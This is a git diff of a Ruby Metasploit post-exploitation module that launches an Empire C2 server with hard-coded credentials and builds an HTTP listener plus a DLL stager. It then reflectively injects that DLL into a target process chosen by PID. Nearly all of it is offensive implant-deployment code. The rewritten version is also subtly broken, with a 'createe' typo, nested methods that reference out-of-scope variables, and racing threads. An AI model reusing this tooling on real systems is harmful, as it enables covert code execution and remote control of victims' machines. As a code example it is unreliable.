@@ -26,56 +26,71 @@ class MetasploitModule < Msf::Post
         OptInt.new('PID', [true,'Process Identifier to inject the Empire payload into'])
       ])
   end
-    #run method for when run command is issued
   def run
-    print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?
-    #Make sure that 1337 is not being used by another service
-    command = "netstat -nlt | grep 1337"
-    value = system(command)
-    raise "Port 1337 is already in use by foreign service" if value
-
-    #Fetching User inputs
-    path = datastore['PathToEmpre'].to_s
+    #Storing user inputs.
+    path = datastore['PathToEmpire'].to_s.chomp
+    port = datastore['LPORT'].to_s
     pid = datastore['PID'].to_i
-    lport = datastore['LPORT'].to_s
 
-    #Initiating the Empire Instance thread with provided username and pass
-    Dir.chdir(path.chomp)
-    command = "./empire --headless --username 'msf-empire' --password 'msf-empire' > /dev/null"
-    print_status("Initiating Empire Web-API, this may take upto few seconds")
-    server = Thread.new{
+    #Changing the working directory to the provided path
+    Dir.chdir(path)
+
+    #method to initiate the web-API
+    def initiate_API
+      command = "./empire --headless --username 'empire-msf' --password 'empire-msf' > /dev/null"
       value = system(command)
+    end
+
+    #method to create the reflectivly injectable DLL
+    def create_DLL
+      generate_reflective_DLL('Listener_Emp',port)
+    end
+
+    #main function
+    def main
+
+      #Setting up Empire
+      print_status("Initiating the Empire Web-API instance. Might take few moments")
+      sleep(15)
+      print_status("Creating empire instance")
+      client_emp = Msf::Empire::Client.new('empire-msf','empire-msf')
+      print_status("Creating reflectively injectable DLL")
+
+      #Defining the payload path
+      payload_path = '/tmp/launcher-emp.dll'
+
+      #Injecting the created DLL payload reflectively in provided process
+      host_process = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
+      print_status("Injecting #{payload_path} into #{pid}")
+      dll_mem, offset = inject_dll_into_process(host_process, payload_path)
+      print_status("DLL Injected. Executing Reflective loader")
+      host_process.thread.createe(dll_mem + offset, 0)
+      print_status("DLL injected and invoked")
+    end
+
+    #method to generate reflective DLL from empire-cli
+    def generate_reflective_DLL(listener_name, port)
+      dll = File.open('/root/dll_generator.rc',"w")
+      dll.puts ("listeners\nuselisteners http\nset Name #{listener_name}\nset Port #{port}\nexecute\nlisteners\nusestager windows/dll\nset Listener #{listener_name}\nset Outfile /tmp/launcher-emp.dll\ngenerate")
+      dll.close
+      command = './empire --resource /root/dll_generator.rc > /dev/null'
+      value = system(command)
+    end
+
+    #Commencing threads
+    thread_api = Thread.new{
+      initiate_API()
     }
-    sleep(10)
+    thread_cli = Thread.new{
+      create_DLL()
+    }
+    thread_main = Thread.new{
+      main()
+    }
 
-    #Creating the Empire Object
-    client_emp = Msf::Empire::Client.new('msf-empire', 'msf-empire')
+    #Joining the main thread
+    thread_main.join
 
-    #Creating a listener which will be destroyed after session)
-    listener_name = "Listener_Emp"
-    response = client_emp.create_listener(listener_name, lport)
-    raise reponse.to_s if response.to_s.include?("error")
-    print_status(response)
-
-    #Creating the DLL for reflective DLL injection
-    payload_path = "/tmp/launcher-emp.dll"
-    print_status("Creating DLL for injection")
-    client_emp.gen_stager(listener_name,"launcher/dll", payload_path)
-
-    #Injecting the created DLL payload reflectively in the target process
-    host_process = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
-    print_status("Injecting #{payload_path} into #{pid}")
-    dll_mem, offset = inject_dll_into_process(host_process, payload_path)
-    print_status("DLL Injected. Executing Reflective loader")
-    host_process.thread.create(dll_mem + offset, 0)
-    print_status("DLL injected and invoked")
-
-    #Checking for agents connected after an interval of 6 seconds
-    sleep(6)
-    agent_name = client_emp.get_agents(true)
-
-    #Interacting with detected agent.
-    ui_main(client_emp, agent_name)
   end
 end
 
